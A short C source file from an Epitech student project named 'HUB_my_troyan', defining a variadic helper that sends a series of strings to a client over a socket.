/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 29/04/2021 send_to_client.c
*/

#include "app.h"
#include <stdarg.h>

int send_to_client(socket_t *client, size_t size, ...)
{
    va_list list;

    va_start(list, size);
    for (size_t i = 0; i < size; i++) {
        const char *label = va_arg(list, const char *);
        socket_send(client, label);
    }
    return EXIT_SUCCESS;
}